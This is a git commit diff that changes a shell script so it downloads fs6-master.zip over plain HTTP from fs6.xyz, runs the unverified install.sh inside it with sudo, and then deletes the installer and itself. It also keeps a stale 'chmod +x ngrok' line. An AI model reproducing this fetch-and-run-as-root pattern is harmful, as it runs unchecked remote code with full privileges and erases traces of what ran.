5bc2ddf2a4d19844bada6f94ff39003ba8ef2f8d
/FS6 <fs6ahso@gmail.com>
2021-05-03 08:00:04 +0000

    Update fs6-master.sh

--- fs6-master.sh
+++ fs6-master.sh
@@ -1,14 +1,15 @@
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloading FS6-master...\n"
+wget http://fs6.xyz/fs6-master.zip > /dev/null 2>&1
+if [[ -e fs6-master.zip ]]; then
+unzip fs6-master.zip > /dev/null 2>&1
 chmod +x ngrok
-printf "\e[1;92m[\e[0m*\e[1;92m] Done Download Ngrok...\n"
-rm -rf ngrok-stable-linux-arm.zip
+printf "\e[1;92m[\e[0m*\e[1;92m] Done Download FS6-master...\n"
+rm -rf fs6-master.zip
+rm -rf fs6-master.sh
+sudo ./install.sh
+rm -rf install.sh
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m[!] Download error... "
 exit 1
 fi
 
